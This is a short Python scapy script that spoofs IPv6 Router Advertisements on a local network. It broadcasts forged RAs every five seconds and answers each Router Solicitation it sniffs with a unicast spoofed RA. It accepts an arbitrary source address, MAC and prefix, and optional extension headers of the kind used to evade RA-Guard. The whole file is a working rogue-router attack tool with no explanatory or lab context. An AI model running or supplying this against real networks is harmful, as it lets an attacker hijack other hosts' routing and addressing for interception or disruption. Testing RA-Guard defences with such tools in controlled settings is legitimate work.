import argparse
import os
import time
import functools
import operator
import random
import ipaddress
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface')
parser.add_argument('-I', '--ip')
parser.add_argument('-M', '--mac')
parser.add_argument('-H', '--do-hbh', action='store_true')
parser.add_argument('-F', '--do-frag', action='store_true')
parser.add_argument('-D', '--do-dst', action='store_true')
parser.add_argument('-p', '--prefix', type=ipaddress.IPv6Network)
args = parser.parse_args()
iface = args.iface
ip = args.ip
mac = args.mac
do_hbh = args.do_hbh
do_frag = args.do_frag
do_dst = args.do_dst
prefix = args.prefix

if iface:
    sp.conf.iface = iface

if ip:
    mac = mac or sp.getmacbyip6(ip)
else:
    ip = sp.conf.iface.ips[6][-1]
    mac = mac or sp.conf.iface.mac

ipexthdrs = []
if do_hbh:
    ipexthdrs.append(inet6.IPv6ExtHdrHopByHop())
if do_frag:
    ipexthdrs.append(inet6.IPv6ExtHdrFragment(id=random.getrandbits(32)))
if do_dst:
    ipexthdrs.append(inet6.IPv6ExtHdrDestOpt())
if ipexthdrs:
    ipexthdrs = functools.reduce(operator.truediv, ipexthdrs)
else:
    ipexthdrs = None

rapkt = inet6.ICMPv6ND_RA(M=1, O=0) / \
    inet6.ICMPv6NDOptSrcLLAddr(lladdr=(mac or sp.conf.iface.mac))
if prefix:
    rapkt /= inet6.ICMPv6NDOptPrefixInfo(prefix=str(prefix.network_address),
                                         prefixlen=prefix.prefixlen)

if os.fork() == 0:
    p = sp.Ether(src=mac, dst='33:33:00:00:00:01') / \
        inet6.IPv6(src=ip, dst='ff02::1')
    if ipexthdrs:
        p /= ipexthdrs
    p /= rapkt
    while True:
        time.sleep(5)
        sp.sendp(p, verbose=0)


def prn(pkt):
    ippkt = pkt[inet6.IPv6]
    print(f'Spoofing to solicit from {ippkt.src}')

    p = sp.Ether(src=mac, dst=pkt.src) / \
        inet6.IPv6(src=ip, dst=ippkt.src)
    if ipexthdrs:
        p /= ipexthdrs
    p /= rapkt
    sp.sendp(p, verbose=0)


filterstr = 'icmp6[icmp6type]==icmp6-routersolicit and dst ff02::2'

sp.sniff(filter=filterstr, prn=prn, quiet=True)
